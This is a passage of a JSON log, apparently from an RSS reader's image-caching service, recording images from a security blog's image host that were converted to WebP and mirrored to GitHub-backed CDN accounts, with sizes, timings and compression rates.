KB","compressRate":"177.2%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/04/874f188c-fe31-4e60-91d2-e9633ab5a3b9.png-w331s","sourceStatusCode":200,"destWidth":887,"destHeight":602,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn52@2020_5/2020/08/24/21-15-00-289_41c56cf5d658fa20.webp","sourceBytes":10617,"destBytes":43252,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":3411,"convertSpendMs":19,"createdTime":"2020-08-25 05:14:58","host":"europe-58*","referer":"https://blog.knownsec.com/?p=5022","linkMd5ListStr":"3be24b3dafcda97d2cd1d8bdc8240c69","githubUser":"myreaderx7","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"10.4 KB","destSize":"42.2 KB","compressRate":"407.4%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/02/424e007b-532f-4978-95ba-bcda0cc7edf8.png-w331s","sourceStatusCode":200,"destWidth":1853,"destHeight":676,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn88@2020_4/2020/08/24/21-15-00-713_bc366ad43567f639.webp","sourceBytes":88676,"destBytes":110006,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1432,"convertSpendMs":48,"createdTime":"2020-08-25 05:15:00","host":"us-016*","referer":"https://blog.knownsec.com/?p=5027","linkMd5ListStr":"85885b4354ee52f93eb5242e82c5fd02","githubUser":"myreaderx31","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"86.6 KB","destSize":"107.4 KB","compressRate":"124.1%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/04/5dae87a4-ad25-4680-b86b-cafc19562f3e.png-w331s","sourceStatusCode":200,"destWidth":1507,"destHeight":400,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn55@2020_1/2020/08/24/21-15-01-059_cd158a53a70d3880.webp","sourceBytes":46665,"destBytes":56236,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":2217,"convertSpendMs":49,"createdTime":"2020-08-25 05:14:59","host":"us-035*","referer":"https://blog.knownsec.com/?p=5024","linkMd5ListStr":"76d99b92fc03ec11de8661e415c762e4","githubUser":"myreaderx29","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"45.6 KB","destSize":"54.9 KB","compressRate":"120.5%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/02/ed8c53cf-66fb-4b4e-b337-84d9e7f15818.png-w331s","sourceStatusCode":200,"destWidth":1867,"destHeight":834,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn51@2020_2/2020/08/24/21-15-00-523_ba4ff810fa072144.webp","sourceBytes":119050,"destBytes":112230,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":2254,"convertSpendMs":59,"createdTime":"2020-08-25 05:14:59","host":"europe-56*","referer":"https://blog.knownsec.com/?p=5027","linkMd5ListStr":"85885b4354ee52f93eb5242e82c5fd02","githubUser":"myreaderx11","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"116.3 KB","destSize":"109.6 KB","compressRate":"94.3%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/01/cfe7f0b5-da1c-459e-beaa-31d812320232.png-w331s","sourceStatusCode":200,"destWidth":999,"destHeight":486,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn76@2020_3/2020/08/24/21-15-00-712_60698ff6701d9591.webp","sourceBytes":32211,"destBytes":38860,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1616,"convertSpendMs":17,"createdTime":"2020-08-25 05:15:00","host":"europe-58*","referer":"https://blog.knownsec.com/?p=5035","linkMd5ListStr":"ab33b3ddb46874e5b2d2b211d2a3a454","githubUser":"myreaderx25","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"31.5 KB","destSize":"37.9 KB","compressRate":"120.6%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/05/e23f4b42-04d2-4360-802e-84d4390eab2d.png-w331s","sourceStatusCode":200,"destWidth":1878,"destHeight":985,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn92@2020_1/2020/08/24/21-15-01-007_d2194845fba6098a.webp","sourceBytes":149411,"destBytes":162754,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1530,"convertSpendMs":87,"createdTime":"2020-08-25 05:15:00","host":"us-006*","referer":"https://blog.knownsec.com/?p=5015","linkMd5ListStr":"4a5286bc6e84190a6e8a94ada1248a16","githubUser":"myreaderx1","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"145.9 KB","destSize":"158.9 KB","compressRate":"108.9%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/03/58811221-0dd8-44a4-80af-d6d737edf79e.png-w331s","sourceStatusCode":200,"destWidth":1259,"destHeight":516,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn96@2020_6/2020/08/24/21-15-00-590_6f09c06ed4efe01f.webp","sourceBytes":47220,"destBytes":84926,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":3057,"convertSpendMs":28,"createdTime":"2020-08-25 05:14:59","host":"europe-23*","referer":"https://blog.knownsec.com/?p=5031","linkMd5ListStr":"4b26291a0ec99cf126b9bcc0d9c59c35","githubUser":"myreaderx3","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"46.1 KB","destSize":"82.9 KB","compressRate":"179.9%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/01/3d3f6fb2-6e49-459a-a211-0e89b928047d.png-w331s","sourceStatusCode":200,"destWidth":970,"destHeight":514,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn32@2020_5/2020/08/24/21-15-01-121_e5e6ada931c9008b.webp","sourceBytes":193392,"destBytes":45712,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":3877,"convertSpendMs":42,"createdTime":"2020-08-25 05:14:58","host":"us-035*","referer":"https://blog.knownsec.com/?p=5035","linkMd5ListStr":"ab33b3ddb46874e5b2d2b211d2a3a454","githubUser":"myreaderx21","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"188.9 KB","destSize":"44.6 KB","compressRate":"23.6%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/03/c348be70-1682-4665-9595-bfd83b89aa7e.png-w331s","sourceStatusCode":200,"destWidth":810,"destHeight":238,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn96@2020_5/2020/08/24/21-15-01-026_3dfdedc2e3831983.webp","sourceBytes":32180,"destBytes":19616,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1344,"convertSpendMs":9,"createdTime":"2020-08-25 05:15:00","host":"europe21*","referer":"https://blog.knownsec.com/?p=5029","linkMd5ListStr":"00b4fc44d295b8070944202e12783d61","githubUser":"myreaderx24","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"31.4 KB","destSize":"19.2 KB","compressRate":"61%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/05/815358e5-e926-4bdf-94c6-a953bd8bd779.png-w331s","sourceStatusCode":200,"destWidth":1066,"destHeight":594,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn15@2020_5/2020/08/24/21-15-01-245_07c2ed8dc001ca42.webp","sourceBytes":32516,"destBytes":53288,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1127,"convertSpendMs":23,"createdTime":"2020-08-25 05:15:01","host":"us-008*","referer":"https://blog.knownsec.com/?p=5013","linkMd5ListStr":"c8d4535c12d7f5a007abcd8ebe8e7714","githubUser":"myreaderx4","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"31.8 KB","destSize":"52 KB","compressRate":"163.9%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/01/8544581b-1f88-439a-b631-fc557ab7b4d2.png-w331s","sourceStatusCode":200,"destWidth":5768,"destHeight":960,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn80@2020_4/2020/08/24/21-15-01-087_5c5249112aac0944.webp","sourceBytes":888617,"destBytes":114378,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1832,"convertSpendMs":198,"createdTime":"2020-08-25 05:15:00","host":"us-037*","referer":"https://blog.knownsec.com/?p=5035","linkMd5ListStr":"ab33b3ddb46874e5b2d2b211d2a3a454","githubUser":"myreaderx30","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"867.8 KB","destSize":"111.7 KB","compressRate":"12.9%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/01/8d773148-62b9-4594-8213-5566fbdfb499.png-w331s","sourceStatusCode":200,"destWidth":1180,"destHeight":743,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn27@2020_6/2020/08/24/21-15-01-207_8fc332a7e8199b52.webp","sourceBytes":70778,"destBytes":104492,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":2963,"convertSpendMs":36,"createdTime":"2020-08-25 05:14:59","host":"us-54*","referer":"https://blog.knownsec.com/?p=5037","linkMd5ListStr":"23161d8db2ce524c7b61906d36af8d85","githubUser":"myreaderx13","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"69.1 KB","destSize":"102 KB","compressRate":"147.6%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/01/c847d3bf-ba54-4569-b854-fab51bfa8d1d.png-w331s","sourceStatusCode":200,"destWidth":1006,"destHeight":595,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn100@2020_5/2020/08/24/21-15-01-161_a78d16d221bd64c6.webp","sourceBytes":43368,"destBytes":72912,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1517,"convertSpendMs":30,"createdTime":"2020-08-25 05:15:00","host":"europe-60*","referer":"https://blog.knownsec.com/?p=5035","linkMd5ListStr":"ab33b3ddb46874e5b2d2b211d2a3a454","githubUser":"myreaderx27","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"42.4 KB","destSize":"71.2 KB","compressRate":"168.1%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/02/4d693cde-92cd-4832-b2ab-569c108c1438.png-w331s","sourceStatusCode":200,"destWidth":1854,"destHeight":835,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn4@2020_3/2020/08/24/21-15-01-285_a54d18e2bd095dbb.webp","sourceBytes":110065,"destBytes":146414,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":4422,"convertSpendMs":61,"createdTime":"2020-08-25 05:14:58","host":"us-54*","referer":"https://blog.knownsec.com/?p=5027","linkMd5ListStr":"85885b4354ee52f93eb5242e82c5fd02","githubUser":"myreaderx5oss","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"107.5 KB","destSize":"143 KB","compressRate":"133%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/05/b09114c5-0e75-4660-acd7-7798c55f7122.png-w331s","sourceStatusCode":200,"destWidth":1824,"destHeight":831,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn99@2020_1/2020/08/24/21-15-01-380_0b20c182a48ad562.webp","sourceBytes":91383,"destBytes":94628,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":3576,"convertSpendMs":42,"createdTime":"2020-08-25 05:14:59","host":"europe62*","referer":"https://blog.knownsec.com/?p=5015","linkMd5ListStr":"4a5286bc6e84190a6e8a94ada1248a16","githubUser":"myreaderx14","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"89.2 KB","destSize":"92.4 KB","compressRate":"103.6%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/01/c56ad36c-ae7d-455c-85e8-3ff005b27d01.png-w331s","sourceStatusCode":200,"destWidth":2830,"destHeight":1037,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn12@2020_2/2020/08/24/21-15-01-439_0dbaa5ebd31fb872.webp","sourceBytes":314532,"destBytes":219672,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1714,"convertSpendMs":143,"createdTime":"2020-08-25 05:15:00","host":"us-018*","referer":"https://blog.knownsec.com/?p=5035","linkMd5ListStr":"ab33b3ddb46874e5b2d2b211d2a3a454","githubUser":"myreaderx2","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"307.2 KB","destSize":"214.5 KB","compressRate":"69.8%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/02/2f67ddf5-a3dc-4932-94ed-c2e6da674c78.png-w331s","sourceStatusCode":200,"destWidth":1845,"destHeight":842,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn7@2020_5/2020/08/24/21-15-01-583_1931ef0811bf33b8.webp","sourceBytes":122504,"destBytes":143958,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1733,"convertSpendMs":55,"createdTime":"2020-08-25 05:15:00","host":"us-028*","referer":"https://blog.knownsec.com/?p=5027","linkMd5ListStr":"85885b4354ee52f93eb5242e82c5fd02","githubUser":"myreaderx14","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"119.6 KB","destSize":"140.6 KB","compressRate":"117.5%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/04/334ef60b-16ef-47e6-9a54-3bddca441d45.png-w331s","sourceStatusCode":200,"destWidth":1329,"destHeight":311,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn71@2020_6/2020/08/24/21-15-01-356_64ccf23891cf0865.webp","sourceBytes":58613,"destBytes":40440,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":2379,"convertSpendMs":17,"createdTime":"2020-08-25 05:15:00","host":"europe69*","referer":"https://blog.knownsec.com/?p=5024","linkMd5ListStr":"76d99b92fc03ec11de8661e415c762e4","githubUser":"myreaderx32","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"57.2 KB","destSize":"39.5 KB","compressRate":"69%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/04/259e9f98-ab2f-4508-8636-fc2795eac68e.png-w331s","sourceStatusCode":200,"destWidth":1023,"destHeight":395,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn36@2020_6/2020/08/24/21-15-01-840_dc78156d2218e7c4.webp","sourceBytes":27440,"destBytes":59606,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1500,"convertSpendMs":58,"createdTime":"2020-08-25 05:15:01","host":"us-020*","referer":"https://blog.knownsec.com/?p=5022","linkMd5ListStr":"3be24b3dafcda97d2cd1d8bdc8240c69","githubUser":"myreaderx12","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"26.8 KB","destSize":"58.2 KB","compressRate":"217.2%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/02/b7cdb93b-acfd-45ea-8fe2-40ad37da7336.png-w331s","sourceStatusCode":200,"destWidth":1855,"destHeight":869,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn80@2020_5/2020/08/24/21-15-01-656_db297b3016bf80d5.webp","sourceBytes":114194,"destBytes":126856,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":4064,"convertSpendMs":476,"createdTime":"2020-08-25 05:14:58","host":"us-040*","referer":"https://blog.knownsec.com/?p=5027","linkMd5ListStr":"85885b4354ee52f93eb5242e82c5fd02","githubUser":"myreaderx1","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"111.5 KB","destSize":"123.9 KB","compressRate":"111.1%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/02/c7483297-c421-4aee-9f79-085f1fbede0c.png-w331s","sourceStatusCode":200,"destWidth":1864,"destHeight":785,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn28@2020_3/2020/08/24/21-15-01-877_10d817afe4b199a9.webp","sourceBytes":102153,"destBytes":124790,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1791,"convertSpendMs":184,"createdTime":"2020-08-25 05:15:01","host":"us-52*","referer":"https://blog.knownsec.com/?p=5027","linkMd5ListStr":"85885b4354ee52f93eb5242e82c5fd02","githubUser":"myreaderx5oss","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"99.8 KB","destSize":"121.9 KB","compressRate":"122.2%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/02/b31fd03f-a17f-4955-b112-dd3ca941a5e4.png-w331s","sourceStatusCode":200,"destWidth":1855,"destHeight":776,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn39@2020_4/2020/08/24/21-15-01-795_0e95ee7b40abd81b.webp","sourceBytes":91747,"destBytes":109064,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1629,"convertSpendMs":188,"createdTime":"2020-08-25 05:15:01","host":"us-010*","referer":"https://blog.knownsec.com/?p=5027","linkMd5ListStr":"85885b4354ee52f93eb5242e82c5fd02","githubUser":"myreaderx13","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"89.6 KB","destSize":"106.5 KB","compressRate":"118.9%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/02/7c4c5cc2-14d2-4108-9c7c-297af12edea8.png-w331s","sourceStatusCode":200,"destWidth":1866,"destHeight":867,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn4@2020_4/2020/08/24/21-15-01-695_ad99a82ddceb452d.webp","sourceBytes":116426,"destBytes":119370,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":2307,"convertSpendMs":487,"createdTime":"2020-08-25 05:15:00","host":"us-040*","referer":"https://blog.knownsec.com/?p=5027","linkMd5ListStr":"85885b4354ee52f93eb5242e82c5fd02","githubUser":"myreaderx3","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"113.7 KB","destSize":"116.6 KB","compressRate":"102.5%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/01/8f9113ec-33b6-4313-bc7a-61e1ab607322.png-w331s","sourceStatusCode":200,"destWidth":2681,"destHeight":931,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn31@2020_3/2020/08/24/21-15-01-976_f77594dda8848695.webp","sourceBytes":148483,"destBytes":357692,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1956,"convertSpendMs":176,"createdTime":"2020-08-25 05:15:01","host":"us-030*","referer":"https://blog.knownsec.com/?p=5035","linkMd5ListStr":"ab33b3ddb46874e5b2d2b211d2a3a454","githubUser":"myreaderx10","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"145 KB","destSize":"349.3 KB","compressRate":"240.9%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/02/d50d45c8-0616-4dea-8058-17524a95a3c0.png-w331s","sourceStatusCode":200,"destWidth":1847,"destHeight":781,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn19@2020_3/2020/08/24/21-15-01-488_de58e3adcac81b27.webp","sourceBytes":96677,"destBytes":115776,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":2049,"convertSpendMs":52,"createdTime":"2020-08-25 05:15:01","host":"europe-23*","referer":"https://blog.knownsec.com/?p=5027","linkMd5ListStr":"85885b4354ee52f93eb5242e82c5fd02","githubUser":"myreaderx6","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"94.4 KB","destSize":"113.1 KB","compressRate":"119.8%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/05/12f037cb-ba9b-4635-8421-5a57331766d8.png-w331s","sourceStatusCode":200,"destWidth":1843,"destHeight":825,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn43@2020_2/2020/08/24/21-15-01-690_f990e0ac4dbbede8.webp","sourceBytes":89520,"destBytes":94076,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1864,"convertSpendMs":60,"createdTime":"2020-08-25 05:15:01","host":"europe-25*","referer":"https://blog.knownsec.com/?p=5015","linkMd5ListStr":"4a5286bc6e84190a6e8a94ada1248a16","githubUser":"myreaderx22","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"87.4 KB","destSize":"91.9 KB","compressRate":"105.1%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/02/551664cc-5b83-42a4-bc12-3ae0a2677bdc.png-w331s","sourceStatusCode":200,"destWidth":1847,"destHeight":850,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn23@2020_2/2020/08/24/21-15-02-435_930cd895f848f1f0.webp","sourceBytes":108440,"destBytes":121720,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":2699,"convertSpendMs":49,"createdTime":"2020-08-25 05:15:01","host":"europe62*","referer":"https://blog.knownsec.com/?p=5027","linkMd5ListStr":"85885b4354ee52f93eb5242e82c5fd02","githubUser":"myreaderx23","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"105.9 KB","destSize":"118.9 KB","compressRate":"112.2%"}],"successGithubMap":{"myreaderx14":7,"myreaderx8":6,"myreaderx15":7,"myreaderx7":7,"myreaderx6":8,"myreaderx16":6,"myreaderx10":8,"myreaderx4":8,"myreaderx32":6,"myreaderx33":6,"myreaderx3":7,"myreaderx11":7,"myreaderx2":7,"myreaderx12":7,"myreaderx13":7,"myreaderx1":7,"myreaderx30":7,"myreaderx31":7,"myreaderx18":7,"myreaderx19":7,"myreaderx":6,"myreaderx25":7,"myreaderx27":7,"myreaderx21":7,"myreaderx22":7,"myreaderx23":7,"myreaderx24":7,"myreaderx5oss":7,"myreaderx29":7},"failGithubMap":{}}